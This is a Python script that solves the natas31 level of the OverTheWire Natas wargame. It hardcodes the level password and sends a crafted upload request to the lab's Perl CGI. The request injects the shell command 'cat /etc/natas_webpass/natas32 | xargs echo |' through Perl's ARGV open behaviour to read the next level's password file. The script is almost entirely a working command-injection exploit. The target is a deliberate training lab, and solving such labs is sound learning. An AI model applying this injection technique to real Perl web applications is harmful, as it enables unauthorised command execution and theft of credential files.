import requests
import re

username = "natas31"
passsowrd = "AMZF14yknOn9Uc57uKB02jnYuhplYka3"
url = "http://%s.natas.labs.overthewire.org/"%username


session = requests.Session()
response = requests.post(url + '/index.pl?cat /etc/natas_webpass/natas32 | xargs echo |',
                         files = [('file', ('filename', 'anything'))],
                         data = {'file': 'ARGV'},
                         auth = (username,passsowrd))

content = response.text

print(content)
